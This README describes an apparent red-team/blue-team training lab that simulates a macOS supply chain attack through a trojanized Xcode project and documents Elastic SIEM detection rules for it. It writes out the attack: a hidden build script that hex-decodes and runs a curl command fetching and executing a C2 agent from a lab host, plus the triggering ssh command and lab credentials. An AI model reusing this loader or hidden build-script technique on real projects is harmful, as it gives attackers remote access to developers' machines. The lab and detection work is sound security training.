# Operation Crimson Defense

```
   ██████╗██████╗ ██╗███╗   ███╗███████╗ ██████╗ ███╗   ██╗
  ██╔════╝██╔══██╗██║████╗ ████║██╔════╝██╔═══██╗████╗  ██║
  ██║     ██████╔╝██║██╔████╔██║███████╗██║   ██║██╔██╗ ██║
  ██║     ██╔══██╗██║██║╚██╔╝██║╚════██║██║   ██║██║╚██╗██║
  ╚██████╗██║  ██║██║██║ ╚═╝ ██║███████║╚██████╔╝██║ ╚████║
   ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝

  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
```

## macOS Supply Chain Attack - Red Team vs Blue Team Exercise

**A complete adversary simulation and detection lab for Xcode supply chain attacks**

```
    ┌─────────────────────────────────────────────────────────────┐
    │                                                             │
    │   🔴 RED TEAM                        🔵 BLUE TEAM           │
    │   ───────────                        ──────────             │
    │   Adaptix C2 Framework               Elastic SIEM           │
    │   Trojanized Xcode Project           Endpoint Detection     │
    │   Hex-Encoded Payloads               Custom Detection Rules │
    │   Gopher Agent (macOS)               Process Telemetry      │
    │                                                             │
    │                    ⚔️  VERSUS  🛡️                           │
    │                                                             │
    └─────────────────────────────────────────────────────────────┘
```

---

## Overview

This project provides a complete red team vs blue team exercise environment simulating a macOS supply chain attack via trojanized Xcode projects. Based on real-world malware techniques discovered through PCAP analysis.

### Attack Chain

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         SUPPLY CHAIN ATTACK FLOW                          │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. WEAPONIZE                    2. DELIVER                              │
│  ┌─────────────────┐            ┌─────────────────┐                     │
│  │ Trojanize Xcode │ ────────►  │ GitHub/GitLab   │                     │
│  │ Project         │            │ Fake Tutorial   │                     │
│  └─────────────────┘            └────────┬────────┘                     │
│                                          │                               │
│  3. EXECUTE                              ▼                               │
│  ┌─────────────────┐            ┌─────────────────┐                     │
│  │ Developer Opens │ ◄───────── │ Developer Clones│                     │
│  │ & Builds (Cmd+B)│            │ Project         │                     │
│  └────────┬────────┘            └─────────────────┘                     │
│           │                                                              │
│           ▼                                                              │
│  ┌─────────────────┐                                                    │
│  │ xcassets.sh     │  Hidden build script in xcuserdata/.xcassets/     │
│  │ executes        │                                                    │
│  └────────┬────────┘                                                    │
│           │                                                              │
│           ▼                                                              │
│  ┌─────────────────┐                                                    │
│  │ xxd -p -r       │  Decode hex-encoded payload                        │
│  │ decodes payload │                                                    │
│  └────────┬────────┘                                                    │
│           │                                                              │
│           ▼                                                              │
│  4. INSTALL                      5. COMMAND & CONTROL                   │
│  ┌─────────────────┐            ┌─────────────────┐                     │
│  │ curl downloads  │ ────────►  │ Adaptix C2      │                     │
│  │ agent to /tmp/.a│            │ GopherTCP:9090  │                     │
│  └────────┬────────┘            └─────────────────┘                     │
│           │                              ▲                               │
│           ▼                              │                               │
│  ┌─────────────────┐                     │                               │
│  │ Agent executes  │ ────────────────────┘                              │
│  │ beacons to C2   │  Full remote access achieved                       │
│  └─────────────────┘                                                    │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Lab Environment

### Infrastructure

| System | IP Address | Role | Platform |
|--------|------------|------|----------|
| **Adaptix C2** | 192.168.36.226 | Command & Control | Ubuntu 22.04 |
| **Elastic SIEM** | 192.168.36.131 | Detection & Monitoring | Debian 12 |
| **macOS Target** | 192.168.36.178 | Victim Endpoint | macOS 15.7.4 |

### Red Team Stack

| Component | Port | Description |
|-----------|------|-------------|
| Adaptix Teamserver | 4321 | Operator interface |
| GopherTCP Listener | 9090 | macOS agent callbacks |
| Payload Server | 9999 | Agent binary hosting |

### Blue Team Stack

| Component | Port | Description |
|-----------|------|-------------|
| Kibana | 5601 | SIEM dashboard |
| Elasticsearch | 9200 | Event storage |
| Fleet Server | 8220 | Agent management |

---

## Quick Start

### Red Team - Execute Attack

```bash
# 1. Verify C2 is ready
curl -I http://192.168.36.226:9999/agent.bin

# 2. Execute supply chain attack
ssh user@192.168.36.178 'bash /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh'

# 3. Verify agent callback
ssh user@192.168.36.178 'ps aux | grep /tmp/.a'
```

### Blue Team - Detect Attack

```bash
# 1. Open Elastic SIEM
open https://192.168.36.131:5601
# Login: elastic / elasticpassword

# 2. Navigate to Security > Alerts
# Expected: 35 alerts from custom detection rules

# 3. Or query via API
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:5601/api/detection_engine/signals/search" \
  -H "kbn-xsrf: true" -d '{"query":{"match_all":{}},"size":10}'
```

---

## Detection Results

### Custom Rules Created

| Rule | Severity | Alerts | Description |
|------|----------|--------|-------------|
| Suspicious Script Execution from Xcode Project | CRITICAL | 17 | Detects bash executing from xcuserdata |
| Hex Payload Decoding via xxd | HIGH | 6 | Detects xxd -p -r payload decoding |
| Curl Download to Tmp with Execution | HIGH | 12 | Detects curl + chmod to /tmp |

### Why Prebuilt Rules Failed

The Elastic prebuilt rule "Potential Hex Payload Execution via Common Utility" **only targets Linux** (`host.os.type == "linux"`), leaving macOS supply chain attacks undetected.

**Gap Identified:** macOS developer-targeted attacks require custom detection rules.

---

## Obfuscation Technique

Matches real-world malware using hex encoding via `xxd`:

```bash
# Original command
curl -fskL http://192.168.36.226:9999/agent.bin -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a &

# Hex encoded
6375726c202d66736b4c20687474703a2f2f3139322e3136382e33362e3232363a393939392f...

# Malicious script (xcassets.sh)
#!/usr/bin/env bash
x=$(echo '6375726c...' | xxd -p -r)
bash -c "$x"
```

---

## Directory Structure

```
operation-crimson-defense/
├── README.md                           # This file
├── docs/
│   ├── RUNBOOK.md                      # Step-by-step attack guide
│   ├── BLUE_TEAM_IOC.md                # Detection rules & IOCs
│   └── LAB_SETUP.md                    # Infrastructure setup
├── xcode_implant/
│   └── implant_xcode_project.py        # Xcode project backdoor injector
├── payloads/
│   ├── obfuscator.py                   # Hex encoding utilities
│   └── payload_generator.py            # Payload generation
├── c2_server/
│   └── c2_server.py                    # Demo C2 (not used - using Adaptix)
├── demo_project/
│   └── MarkdownEditor.xcodeproj/       # Sample trojanized project
└── scripts/
    └── setup.sh                        # Environment setup
```

---

## Key Findings

### Attack Artifacts

| Artifact | Location | Description |
|----------|----------|-------------|
| Malicious Script | `.xcodeproj/xcuserdata/.xcassets/xcassets.sh` | Build phase payload |
| Agent Binary | `/tmp/.a` | Adaptix Gopher agent |
| Download Source | `http://192.168.36.226:9999/agent.bin` | Payload staging |

### Process Chain (Captured by Elastic)

```
bash /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh
  └── xxd -p -r                          # Decode payload
      └── bash -c "curl ... && chmod ... && /tmp/.a"
          ├── curl -fskL ... -o /tmp/.a  # Download agent
          ├── chmod +x /tmp/.a           # Make executable
          └── /tmp/.a                    # Execute agent
              └── TCP -> 192.168.36.226:9090  # C2 callback
```

---

## Credentials

### Red Team (Adaptix C2)

| Service | Credentials |
|---------|-------------|
| Teamserver (192.168.36.226:4321) | admin:AdminOp123! |
| SSH (192.168.36.226) | localuser:password |

### Blue Team (Elastic SIEM)

| Service | Credentials |
|---------|-------------|
| Kibana (192.168.36.131:5601) | elastic:elasticpassword |
| SSH (192.168.36.131) | debian:debian |

### Target (macOS)

| Service | Credentials |
|---------|-------------|
| SSH (192.168.36.178) | user:password |

---

## Documentation

| Document | Description |
|----------|-------------|
| [RUNBOOK.md](docs/RUNBOOK.md) | Complete attack execution guide |
| [BLUE_TEAM_IOC.md](docs/BLUE_TEAM_IOC.md) | Detection rules, YARA, Sigma, queries |
| [LAB_SETUP.md](docs/LAB_SETUP.md) | Infrastructure configuration |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Supply Chain Compromise | T1195.002 | Trojanized Xcode project |
| Command and Scripting Interpreter | T1059.004 | Bash script execution |
| Obfuscated Files or Information | T1027 | Hex-encoded payload |
| Ingress Tool Transfer | T1105 | Curl download of agent |
| Application Layer Protocol | T1071 | GopherTCP C2 channel |

---

## Legal Notice

This project is provided for **authorized security testing and educational purposes only**.

- All activity is contained within an isolated lab network
- Adaptix C2 is a legitimate red team tool
- Obtain proper authorization before using these techniques

**The authors assume no liability for misuse of this software.**

---

## Credits

- **Adaptix C2 Framework** - https://github.com/5P34R/AdaptixC2
- **Elastic Security** - https://www.elastic.co/security
- **PCAP Analysis** - Original malware forensics that inspired this exercise

```
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   "The best defense is understanding the offense"         ║
    ║                                                           ║
    ║                    🔴 RED vs BLUE 🔵                       ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
```
